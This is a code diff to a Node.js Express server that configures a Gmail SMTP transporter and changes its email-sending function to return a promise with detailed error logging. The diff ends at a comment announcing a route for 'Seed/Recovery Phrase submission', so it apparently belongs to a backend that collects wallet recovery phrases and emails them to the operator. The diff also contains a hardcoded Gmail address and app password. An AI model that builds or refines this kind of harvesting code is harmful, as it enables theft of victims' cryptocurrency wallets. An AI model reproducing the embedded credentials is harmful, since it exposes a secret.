@@ -21,8 +21,8 @@ app.use(bodyParser.urlencoded({ extended: true }));
 // Configure Nodemailer transporter
 const transporter = nodemailer.createTransport({
   host: "smtp.gmail.com",
-  port: 587,
-  secure: false,
+  port: 465,
+  secure: true,
   auth: {
     user: "Mikun5y@gmail.com", // Replace with your email
     pass: "ewqd npti edao xqvj", // Replace with your app password
@@ -39,13 +39,22 @@ function sendEmail(subject, text) {
     text: text,
   };
 
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.error("Error sending email:", error);
-    } else {
-      console.log("Email sent:", info.response);
-    }
-  });
+  // transporter.sendMail(mailOptions, (error, info) => {
+  //   if (error) {
+  //     console.error("Error sending email:", error);
+  //   } else {
+  //     console.log("Email sent:", info.response);
+  //   }
+  // });
+  return transporter.sendMail(mailOptions)
+    .then(info => {
+      console.log('Email sent successfully:', info.response);
+      return info;
+    })
+    .catch(error => {
+      console.error('Detailed email error:', error);
+      throw error;
+    });
 }
 
 // Route for handling Seed/Recovery Phrase submission
